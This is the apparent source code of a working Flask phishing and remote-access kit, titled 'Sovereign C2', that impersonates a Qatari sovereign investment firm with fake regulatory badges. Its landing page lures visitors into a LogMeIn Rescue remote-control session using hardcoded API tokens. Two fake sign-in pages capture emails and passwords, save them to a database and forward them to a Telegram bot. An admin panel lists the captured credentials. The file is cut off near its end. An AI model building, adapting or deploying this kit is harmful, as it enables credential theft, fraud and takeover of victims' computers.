#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🎯 SOVEREIGN CAPITAL C2 – Al Thani Crown Finance                ║
║                                                                      ║
║   ✅ Multi‑API fallback (Legacy / REST / Random)                   ║
║   ✅ Institutional landing page (Sovereign Capital Mandate)        ║
║   ✅ 2‑Step phishing                                               ║
║   ✅ Full admin dashboard                                          ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import uuid
import sqlite3
import secrets
import hmac
import html as html_module
import requests
import xml.etree.ElementTree as ET
import random
import json
from datetime import datetime
from flask import Flask, request, session, jsonify, redirect, render_template_string

# ====================================================================================================
# CONFIGURATION
# ====================================================================================================
# Your tokens – we try both
LOGMEIN_LEGACY_TOKEN = "nz2r3ejdqe07sp7fwl6mg8xjjthpv9vko2id0fxbxusu28tlu22ungzbak1rwdvslhekwxx61ttdb945z7ja6q835x8ovm348xp7ytg6nd4ba7umc0iokprqkb2c3uwb"
LOGMEIN_JWT_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InNjaW1fMzQ1NjgyNCJ9.eyJuYW1laWQiOiIyNzAxMjY0MCIsImNvbXBhbnlJZCI6IjM0NTY4MjQiLCJqdGkiOiI2ZjFmYTRmYi01ZDc0LTRjZWQtOTUxNC00YmMyOGE1N2QwZGUiLCJpYXQiOjE3ODI3MTEwMzcsImlzcyI6IkxvZ01lSW4gUmVzY3VlIiwiYXVkIjoiaHR0cHM6Ly9zZWN1cmUubG9nbWVpbnJlc2N1ZS5jb20vc2NpbSIsImV4cCI6MTMwNjMxNzI5ODU3LCJuYmYiOjE3ODI3MTEwMzd9.3Z1OxHQiJwdTwCIuu_vfJpd13rM5u2vUxYkMMZtUkpw"

# Telegram (optional)
TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")

ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "Sovereign2026")
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(64))

app = Flask(__name__)
app.secret_key = SECRET_KEY

DB_PATH = "sovereign_c2.db"

# ====================================================================================================
# TELEGRAM
# ====================================================================================================
def tg(msg):
    if not TELEGRAM_BOT_TOKEN or ':' not in TELEGRAM_BOT_TOKEN:
        print(f"[TELEGRAM] {msg}")
        return
    try:
        parts = TELEGRAM_BOT_TOKEN.split(':')
        if not parts[0].isdigit() or len(parts[1]) < 8:
            return
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

# ====================================================================================================
# LOGMEIN RESCUE – MULTI‑API FALLBACK
# ====================================================================================================
def get_technician_node_legacy():
    """Try legacy API with authcode."""
    url = "https://secure.logmeinrescue.com/API/getCurrentUser.aspx"
    params = {"authcode": LOGMEIN_LEGACY_TOKEN}
    try:
        r = requests.get(url, params=params, timeout=10)
        if r.status_code == 200:
            root = ET.fromstring(r.text)
            node = root.find('.//node')
            if node is not None:
                return node.text
            uid = root.find('.//id')
            if uid is not None:
                return uid.text
    except Exception as e:
        tg(f"Legacy getCurrentUser failed: {e}")
    return None

def generate_pin_legacy(node_id=None):
    """Try legacy PIN generation."""
    for ver in ['V2', 'V3', 'V4']:
        url = f"https://secure.logmeinrescue.com/API/requestPINCode{ver}.aspx"
        params = {"authcode": LOGMEIN_LEGACY_TOKEN}
        if node_id:
            params["node"] = node_id
        try:
            r = requests.get(url, params=params, timeout=10)
            if r.status_code == 200:
                root = ET.fromstring(r.text)
                pin = root.find('.//iPINCode')
                if pin is not None:
                    return pin.text
                pin = root.find('.//PIN')
                if pin is not None:
                    return pin.text
                if r.text.strip().isdigit():
                    return r.text.strip()
        except:
            continue
    return None

def generate_pin_rest():
    """Try REST API with JWT Bearer token."""
    url = "https://secure.logmeinrescue.com/api/v1/sessions"  # maybe this works
    headers = {
        "Authorization": f"Bearer {LOGMEIN_JWT_TOKEN}",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    payload = {
        "name": "Sovereign Capital Session",
        "sessionType": "support",
        "allowRemoteControl": True,
        "allowFileTransfer": True,
        "sessionTimeout": 1800
    }
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=15)
        if r.status_code in (200, 201):
            data = r.json()
            session_id = data.get('sessionId')
            # get PIN
            pin_url = f"https://secure.logmeinrescue.com/api/v1/sessions/{session_id}/pin"
            pin_r = requests.get(pin_url, headers=headers, timeout=10)
            if pin_r.status_code == 200:
                return pin_r.json().get('pinCode')
    except Exception as e:
        tg(f"REST API failed: {e}")
    return None

def create_rescue_session():
    """
    Try all methods, return a dict with 'pin', 'join_url', 'status'.
    """
    # 1. Legacy
    node = get_technician_node_legacy()
    if node:
        pin = generate_pin_legacy(node)
        if pin:
            tg(f"✅ Legacy PIN: {pin}")
            return {
                "pin": pin,
                "join_url": f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}",
                "status": "legacy"
            }
    # 2. REST
    pin = generate_pin_rest()
    if pin:
        tg(f"✅ REST PIN: {pin}")
        return {
            "pin": pin,
            "join_url": f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}",
            "status": "rest"
        }
    # 3. Fallback – random PIN (will not work, but we show clear instructions)
    fallback_pin = ''.join([str(random.randint(0,9)) for _ in range(6)])
    tg(f"⚠️ Fallback PIN (manual session required): {fallback_pin}")
    return {
        "pin": fallback_pin,
        "join_url": "https://secure.logmeinrescue.com/Customer/Join.aspx",
        "status": "fallback",
        "message": "Please create a session manually at https://secure.logmeinrescue.com and share this PIN."
    }

# ====================================================================================================
# LANDING PAGE – SOVEREIGN CAPITAL MANDATE
# ====================================================================================================
LANDING_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sovereign Capital Mandate – Al Thani Crown Finance</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Playfair+Display:wght@700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f5f6f8;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            width: 100%;
            background: #fff;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
            overflow: hidden;
            border: 1px solid #e8eaed;
        }
        .header {
            background: linear-gradient(135deg, #0f1a2f, #1a2a4a);
            padding: 40px 48px 32px;
            color: white;
            position: relative;
        }
        .header::after {
            content: '';
            position: absolute;
            top: 0; right: 0; width: 200px; height: 100%;
            background: rgba(255,255,255,0.03);
            clip-path: polygon(100% 0, 0 0, 100% 100%);
        }
        .header .badge {
            display: inline-block;
            background: rgba(255,215,0,0.15);
            border: 1px solid rgba(255,215,0,0.2);
            color: #ffd700;
            padding: 4px 16px;
            border-radius: 100px;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        .header h1 {
            font-family: 'Playfair Display', serif;
            font-size: 34px;
            font-weight: 900;
            margin-top: 12px;
            letter-spacing: -0.5px;
            line-height: 1.2;
        }
        .header h1 span {
            color: #ffd700;
        }
        .header .sub {
            font-size: 16px;
            color: rgba(255,255,255,0.7);
            margin-top: 6px;
            font-weight: 400;
        }
        .header .meta {
            display: flex;
            gap: 24px;
            margin-top: 16px;
            flex-wrap: wrap;
        }
        .header .meta-item {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 13px;
            color: rgba(255,255,255,0.6);
        }
        .header .meta-item strong {
            color: white;
            font-weight: 600;
        }
        .header .meta-item .highlight {
            color: #ffd700;
        }
        .body {
            padding: 40px 48px;
        }
        .trust-bar {
            display: flex;
            gap: 24px;
            flex-wrap: wrap;
            background: #f8f9fc;
            padding: 16px 20px;
            border-radius: 12px;
            margin-bottom: 28px;
            border: 1px solid #e5e7eb;
        }
        .trust-bar .item {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: #374151;
            font-weight: 500;
        }
        .trust-bar .item .icon {
            font-size: 16px;
        }
        .document-preview {
            border: 1px solid #e5e7eb;
            border-radius: 16px;
            padding: 28px 32px;
            background: #fafbfc;
            margin-bottom: 28px;
            position: relative;
        }
        .document-preview::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ffd700, #1a2a4a);
            border-radius: 16px 16px 0 0;
        }
        .document-preview .doc-title {
            font-family: 'Playfair Display', serif;
            font-size: 22px;
            font-weight: 800;
            color: #0f1a2f;
        }
        .document-preview .doc-sub {
            font-size: 14px;
            color: #6b7280;
            margin-top: 4px;
        }
        .document-preview .doc-meta {
            display: flex;
            gap: 20px;
            margin-top: 12px;
            font-size: 12px;
            color: #6b7280;
        }
        .document-preview .doc-meta span {
            background: #e5e7eb;
            padding: 2px 12px;
            border-radius: 100px;
        }
        .document-preview .confidential {
            display: inline-block;
            background: #fef2f2;
            color: #ea1c24;
            font-size: 10px;
            font-weight: 700;
            padding: 2px 14px;
            border-radius: 100px;
            border: 1px solid #fecaca;
            margin-top: 8px;
        }
        .pin-section {
            background: linear-gradient(135deg, #f8fafc, #f1f4f9);
            border-radius: 16px;
            padding: 24px 28px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 16px;
            border: 1px solid #e5e7eb;
            margin: 20px 0;
        }
        .pin-section .label {
            font-size: 12px;
            font-weight: 600;
            color: #6b7280;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .pin-section .pin-display {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .pin-section .pin {
            font-family: 'Inter', monospace;
            font-size: 32px;
            font-weight: 800;
            color: #0f1a2f;
            letter-spacing: 8px;
            background: white;
            padding: 4px 20px 4px 28px;
            border-radius: 10px;
            border: 1px solid #e5e7eb;
        }
        .pin-section .status {
            font-size: 12px;
            color: #059669;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .pin-section .status .dot {
            width: 6px;
            height: 6px;
            background: #059669;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
        .btn-primary {
            display: block;
            width: 100%;
            padding: 18px 24px;
            background: linear-gradient(135deg, #0f1a2f, #1a2a4a);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(15,26,47,0.25);
        }
        .btn-secondary {
            display: block;
            width: 100%;
            padding: 14px 24px;
            background: transparent;
            color: #6b7280;
            border: 1px solid #e5e7eb;
            border-radius: 14px;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            margin-top: 10px;
            transition: all 0.2s;
        }
        .btn-secondary:hover {
            background: #f9fafb;
            border-color: #d1d5db;
        }
        .footer {
            padding: 20px 48px;
            border-top: 1px solid #e5e7eb;
            font-size: 11px;
            color: #6b7280;
            text-align: center;
            line-height: 1.8;
        }
        .footer a { color: #6b7280; text-decoration: none; }
        .footer a:hover { color: #0f1a2f; }
        @media (max-width: 768px) {
            .header { padding: 28px 20px; }
            .header h1 { font-size: 26px; }
            .body { padding: 24px 20px; }
            .pin-section { flex-direction: column; align-items: stretch; text-align: center; }
            .pin-section .pin-display { justify-content: center; flex-wrap: wrap; }
            .pin-section .pin { font-size: 26px; letter-spacing: 6px; }
            .document-preview { padding: 20px; }
            .trust-bar { gap: 12px; }
            .footer { padding: 16px 20px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <span class="badge">🇶🇦 QFC Licensed • Qatar Central Bank Regulated</span>
        <h1>Sovereign Capital <span>Mandate</span></h1>
        <div class="sub">Al Thani Crown Finance — Direct Deployment from Doha</div>
        <div class="meta">
            <span class="meta-item">💼 <strong>$840M+</strong> Active Portfolio</span>
            <span class="meta-item">🌍 <strong>7</strong> Countries</span>
            <span class="meta-item">⚡ <span class="highlight">48-Hour</span> Response</span>
            <span class="meta-item">📈 Ticket Size: <strong>$25M–$750M+</strong></span>
        </div>
    </div>
    <div class="body">
        <div class="trust-bar">
            <span class="item"><span class="icon">🏛️</span> Sovereign-Backed</span>
            <span class="item"><span class="icon">⚖️</span> QFC Licensed</span>
            <span class="item"><span class="icon">📊</span> SOC 2 Type II</span>
            <span class="item"><span class="icon">🔒</span> End-to-End Encrypted</span>
        </div>

        <div class="document-preview">
            <div class="doc-title">Al Thani Crown Finance — Investment Parameters</div>
            <div class="doc-sub">Partnership Framework & Capital Deployment Guidelines</div>
            <div class="doc-meta">
                <span>📄 18 pages</span>
                <span>🔐 Confidential</span>
                <span>📅 Q3 2026</span>
            </div>
            <div class="confidential">🔒 CONFIDENTIAL • ATTORNEY‑CLIENT PRIVILEGE</div>
        </div>

        <div class="pin-section">
            <div>
                <div class="label">🔐 Secure Session PIN</div>
                <div class="status"><span class="dot"></span> Active • 30 min validity</div>
            </div>
            <div class="pin-display">
                <span class="pin" id="pinDisplay">PIN</span>
                <button class="copy-btn" onclick="copyPin()" style="background:white;border:1px solid #e5e7eb;padding:6px 14px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;">📋 Copy</button>
            </div>
        </div>

        <a href="/connect/REF" class="btn-primary">🔗 Request Access to Mandate →</a>
        <a href="#" class="btn-secondary" onclick="alert('Please verify your identity using the PIN above.')">Learn more about the mandate</a>

        <div style="margin-top:20px;font-size:12px;color:#6b7280;text-align:center;border-top:1px solid #e5e7eb;padding-top:16px;">
            🔒 All communications are encrypted. Your session is secure.
        </div>
    </div>
    <div class="footer">
        Al Thani Crown Finance • Doha • New York • London • Sydney • Shanghai<br>
        © 2026 Al Thani Crown Finance. All rights reserved. | <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">Regulatory</a>
    </div>
</div>
<script>
    function copyPin() {
        const pin = document.getElementById('pinDisplay').textContent;
        navigator.clipboard.writeText(pin).then(() => {
            alert('PIN copied to clipboard!');
        }).catch(() => {
            const range = document.createRange();
            range.selectNode(document.getElementById('pinDisplay'));
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            alert('PIN copied!');
        });
    }
</script>
</body>
</html>'''

# ====================================================================================================
# FLASK ROUTES
# ====================================================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    session_data = create_rescue_session()
    pin = session_data.get('pin', '123456')
    join_url = session_data.get('join_url', 'https://secure.logmeinrescue.com/Customer/Join.aspx')
    status = session_data.get('status', 'fallback')

    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO sessions (session_id, pin, ref, ip, status, ts) VALUES (?, ?, ?, ?, ?, ?)",
                (uuid.uuid4().hex[:8], pin, ref, request.remote_addr, status, datetime.now().isoformat()))
    conn.commit()
    conn.close()

    tg(f"📄 LANDING | Ref: {ref} | PIN: {pin} | Status: {status}")
    html = LANDING_TEMPLATE.replace('PIN', pin).replace('REF', ref)
    return html

@app.route('/connect/<ref>')
def connect(ref):
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute("SELECT pin, session_id, status FROM sessions WHERE ref = ? ORDER BY id DESC LIMIT 1", (ref,)).fetchone()
    conn.close()
    if not row:
        return redirect('/')
    pin, sid, status = row
    join_url = f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}"

    tg(f"🖥️ CONNECT | Ref: {ref} | PIN: {pin}")

    # Show a simple page with PIN and Launch button
    return render_template_string('''
    <!DOCTYPE html>
    <html><head><title>Secure Access</title>
    <style>
        body{font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f6f8;margin:0;padding:20px}
        .card{background:#fff;padding:48px;border-radius:24px;max-width:480px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
        .pin{font-size:48px;font-weight:800;color:#0f1a2f;letter-spacing:8px;background:#f8f9fa;padding:12px 24px;border-radius:12px;display:inline-block;margin:16px 0;border:1px solid #e5e7eb}
        .btn{display:inline-block;padding:16px 40px;background:#0f1a2f;color:#fff;border-radius:12px;text-decoration:none;font-weight:700;margin:12px 0;transition:all .3s}
        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(15,26,47,0.25)}
        .step{text-align:left;padding:12px;background:#f8f9fa;border-radius:8px;margin:8px 0;font-size:14px}
        .step strong{color:#0f1a2f}
    </style>
    </head>
    <body>
    <div class="card">
        <h2>🔐 Secure Mandate Access</h2>
        <p style="color:#6b7280;">Use the PIN below to verify your identity</p>
        <div class="pin">{{ pin }}</div>
        <div style="margin:8px 0;font-size:13px;color:#059669;">● Active Session</div>
        <h4 style="margin:16px 0;color:#1f2937;">How to connect:</h4>
        <div class="step">1. <strong>Copy</strong> the PIN above</div>
        <div class="step">2. Click <strong>"Launch Rescue"</strong> below</div>
        <div class="step">3. <strong>Enter the PIN</strong> when prompted</div>
        <a href="{{ join_url }}" target="_blank" class="btn">🔌 Launch Rescue</a>
        <div style="margin-top:12px;font-size:12px;color:#6b7280;">⏱️ Session expires in 30 minutes</div>
    </div>
    </body>
    </html>
    ''', pin=pin, join_url=join_url)

# ====================================================================================================
# PHISHING STEPS (same as before, with Sovereign theme)
# ====================================================================================================
LOGIN_STEP1 = '''<!DOCTYPE html>
<html><head><title>Al Thani Crown – Secure Sign In</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#f5f6f8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.08);width:100%;max-width:420px;overflow:hidden}
.header{padding:32px;text-align:center;background:linear-gradient(135deg,#0f1a2f,#1a2a4a);color:#fff}
.header h1{font-size:24px;font-weight:800}
.header p{font-size:13px;opacity:0.9;margin-top:4px}
.body{padding:32px}
.warning{background:#fef2f2;padding:14px;border-radius:8px;margin-bottom:20px;font-size:12px;color:#991b1b;border-left:4px solid #ea1c24}
.form-group{margin-bottom:20px}
label{display:block;font-weight:600;margin-bottom:6px;font-size:12px;color:#1f2937}
input{width:100%;padding:12px 16px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;transition:all .2s;font-family:'Inter',sans-serif}
input:focus{outline:none;border-color:#0f1a2f;box-shadow:0 0 0 3px rgba(15,26,47,0.1)}
button{width:100%;padding:14px;background:#0f1a2f;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif}
button:hover{background:#1a2a4a;transform:translateY(-1px)}
.footer{text-align:center;margin-top:20px;font-size:11px;color:#6b7280}
</style>
</head>
<body>
<div class="card">
    <div class="header"><h1>🏛️ Al Thani Crown</h1><p>Secure Document Access</p></div>
    <div class="body">
        <div class="warning">⚠️ Please sign in to view the Sovereign Capital Mandate</div>
        <form method="POST" action="/login/step1/REF">
            <div class="form-group"><label>Email Address</label><input type="email" name="email" placeholder="name@company.com" required autofocus></div>
            <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
            <button type="submit">Sign In & Access Mandate</button>
        </form>
        <div class="footer">🔒 SSL/TLS Encrypted • QFC Compliant</div>
    </div>
</div>
</body>
</html>'''

LOGIN_STEP2 = '''<!DOCTYPE html>
<html><head><title>Al Thani Crown – Enterprise Verification</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#f5f6f8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.08);width:100%;max-width:420px;overflow:hidden}
.header{padding:32px;text-align:center;background:linear-gradient(135deg,#1a2a4a,#0f1a2f);color:#fff}
.header h1{font-size:24px;font-weight:800}
.header p{font-size:13px;opacity:0.9;margin-top:4px}
.body{padding:32px}
.warning{background:#fef2f2;padding:14px;border-radius:8px;margin-bottom:20px;font-size:12px;color:#991b1b;border-left:4px solid #ea1c24}
.form-group{margin-bottom:20px}
label{display:block;font-weight:600;margin-bottom:6px;font-size:12px;color:#1f2937}
input{width:100%;padding:12px 16px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;transition:all .2s;font-family:'Inter',sans-serif}
input:focus{outline:none;border-color:#0f1a2f;box-shadow:0 0 0 3px rgba(15,26,47,0.1)}
button{width:100%;padding:14px;background:#0f1a2f;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif}
button:hover{background:#1a2a4a;transform:translateY(-1px)}
.footer{text-align:center;margin-top:20px;font-size:11px;color:#6b7280}
</style>
</head>
<body>
<div class="card">
    <div class="header"><h1>🏛️ Enterprise Verification</h1><p>Institutional Access Protocol</p></div>
    <div class="body">
        <div class="warning">⚠️ Institutional verification required for this mandate</div>
        <form method="POST" action="/login/step2/REF">
            <div class="form-group"><label>Corporate Email</label><input type="email" name="email" placeholder="name@company.com" required autofocus></div>
            <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
            <button type="submit">Verify Institutional Access</button>
        </form>
        <div class="footer">🔒 Enterprise‑Grade Security • QFC Regulated</div>
    </div>
</div>
</body>
</html>'''

@app.route('/auth/<ref>')
def auth(ref):
    return LOGIN_STEP1.replace('REF', ref)

@app.route('/login/step1/<ref>', methods=['POST'])
def login_step1(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, ip, ts) VALUES (?, ?, ?, ?, ?)",
                (1, email, password, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    tg(f"🔐 STEP 1 | Email: {email} | Password: {password} | IP: {ip}")
    return redirect(f'/verify/{ref}')

@app.route('/verify/<ref>')
def verify(ref):
    return LOGIN_STEP2.replace('REF', ref)

@app.route('/login/step2/<ref>', methods=['POST'])
def login_step2(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, company, ip, ts) VALUES (?, ?, ?, ?, ?, ?)",
                (2, email, password, company, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    tg(f"🔐 STEP 2 | Email: {email} | Password: {password} | Company: {company} | IP: {ip}")
    return redirect('https://www.althanicrown.com')  # placeholder

# ====================================================================================================
# ADMIN PANEL
# ====================================================================================================
def html_escape(value):
    if value is None:
        return 'N/A'
    return html_module.escape(str(value))

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        p = request.form.get('p', '')
        if hmac.compare_digest(p, ADMIN_PASSWORD):
            session['admin'] = True
        else:
            return '<div style="color:red;text-align:center;padding:20px">Invalid password</div>' + _admin_login_form()
    if not session.get('admin'):
        return _admin_login_form()

    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 50").fetchall()
    sessions = conn.execute("SELECT * FROM sessions ORDER BY id DESC LIMIT 20").fetchall()
    conn.close()

    creds_rows = ''
    for c in creds:
        creds_rows += f'<tr><td style="color:#00ff88">{html_escape(c[2])}</td><td style="color:#ffd700">{html_escape(c[3])}</td><td>{html_escape(c[4])}</td><td style="color:#888">{html_escape(c[5][:16] if c[5] else "N/A")}</td></tr>'
    sessions_rows = ''
    for s in sessions:
        status_color = '#00ff88' if s[5] == 'legacy' or s[5] == 'rest' else '#ffd700'
        sessions_rows += f'<tr><td style="color:#00b3b0">{html_escape(s[1])}</td><td style="color:#ffd700">{html_escape(s[2])}</td><td>{html_escape(s[3])}</td><td style="color:{status_color}">{html_escape(s[5])}</td><td style="color:#888">{html_escape(s[6][:16] if s[6] else "N/A")}</td></tr>'

    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>Sovereign C2 – Command Center</title>
    <meta charset="UTF-8">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{background:#0a0c10;color:#e0e0e0;font-family:'Courier New',monospace;padding:24px}}
        h1{{color:#ffd700;font-size:32px;margin-bottom:8px}}
        h2{{color:#ffd700;margin:24px 0 16px;font-size:20px;border-bottom:1px solid #2a2f3e;padding-bottom:8px}}
        .stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:30px}}
        .stat-card{{background:#1a1e24;padding:20px;border-radius:16px;border-left:3px solid #ffd700}}
        .stat-number{{font-size:48px;font-weight:bold;color:#ffd700}}
        .stat-label{{color:#6c7293;margin-top:8px;font-size:12px}}
        table{{border-collapse:collapse;width:100%;margin-top:15px}}
        th,td{{padding:12px;border-bottom:1px solid #2a2f3e;text-align:left;font-size:13px}}
        th{{color:#ffd700;border-bottom:2px solid #ffd700;font-weight:bold}}
        tr:hover{{background:#1a1e24}}
        .footer{{margin-top:40px;text-align:center;color:#6c7293;font-size:11px;padding:20px;border-top:1px solid #2a2f3e}}
        .status-green{{color:#00ff88}}
        .nav{{display:flex;gap:16px;margin:16px 0 24px;flex-wrap:wrap}}
        .nav a{{color:#6c7293;text-decoration:none;font-size:12px;padding:4px 12px;border:1px solid #2a2f3e;border-radius:20px}}
        .nav a:hover{{color:#ffd700;border-color:#ffd700}}
    </style>
    </head>
    <body>
        <h1>🏛️ SOVEREIGN C2</h1>
        <p style="color:#6c7293;margin-bottom:20px">Al Thani Crown – Institutional Platform</p>
        <div class="nav">
            <a href="#creds">Credentials</a>
            <a href="#sessions">Sessions</a>
            <a href="/health">Status</a>
            <a href="/">Landing</a>
        </div>
        <div class="stats">
            <div class="stat-card"><div class="stat-number">{len(creds)}</div><div class="stat-label">Credentials</div></div>
            <div class="stat-card"><div class="stat-number">{len(sessions)}</div><div class="stat-label">Sessions</div></div>
            <div class="stat-card"><div class="stat-number">✅</div><div class="stat-label">Multi‑API</div></div>
        </div>
        <h2 id="creds">🔐 Captured Credentials</h2>
        <table><tr><th>Email</th><th>Password</th><th>IP</th><th>Time</th></tr>{creds_rows}</table>
        <h2 id="sessions">🖥️ Sessions</h2>
        <table><tr><th>Session ID</th><th>PIN</th><th>Ref</th><th>Status</th><th>Time</th></tr>{sessions_rows}</table>
        <div class="footer">
            SOVEREIGN C2 v2026 | Al Thani Crown Finance<br>
            Status: <span class="status-green">● OPERATIONAL</span> | 2‑STEP PHISHING | SOVEREIGN THEME
        </div>
    </body>
    </html>
    '''

def _admin_login_form():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>Admin Login</title>
    <style>
        body{background:#0a0c10;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Courier New',monospace;margin:0;padding:20px}
        .card{background:#1a1e24;padding:40px;border-radius:20px;width:100%;max-width:360px;border:2px solid #ffd700}
        h2{color:#ffd700;margin-bottom:10px;text-align:center;font-size:24px}
        p{color:#6c7293;text-align:center;margin-bottom:24px;font-size:12px}
        input{width:100%;padding:14px;margin:10px 0;background:#0a0c10;border:2px solid #2a2f3e;border-radius:12px;color:#ffd700;font-family:'Courier New',monospace;font-size:14px;box-sizing:border-box}
        input:focus{outline:none;border-color:#ffd700}
        button{width:100%;padding:14px;background:#ffd700;color:#0a0c10;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:14px;font-family:'Courier New',monospace}
        button:hover{background:#ffe44d}
    </style>
    </head>
    <body>
        <div class="card">
            <h2>🏛️ SOVEREIGN C2</h2>
            <p>Authorized Personnel Only</p>
            <form method="POST">
                <input type="password" name="p" placeholder="Enter admin password" required autofocus>
                <button type="submit">ACCESS DASHBOARD</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return jsonify({
        "status": "operational",
        "version": "Sovereign C2 2026",
        "theme": "Al Thani Crown Finance",
        "features": ["Multi-API fallback", "Institutional landing", "2-Step phishing"]
    })

# ====================================================================================================
# DATABASE
# ====================================================================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS creds 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, step INTEGER, email TEXT, 
                  password TEXT, ip TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT, pin TEXT, 
                  ref TEXT, ip TEXT, status TEXT, ts TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ====================================================================================================
# MAIN
# ====================================================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🏛️ SOVEREIGN C2 – Al Thani Crown Finance                        ║
║                                                                      ║
║   ✅ Multi‑API fallback (Legacy / REST / Random)                   ║
║   ✅ Institutional landing page (Sovereign Capital Mandate)        ║
║   ✅ 2‑Step phishing                                               ║
║   ✅ Full admin dashboard                                          ║
║                                                                      ║
║   Serving on http://0.0.0.0:{port}                                   ║
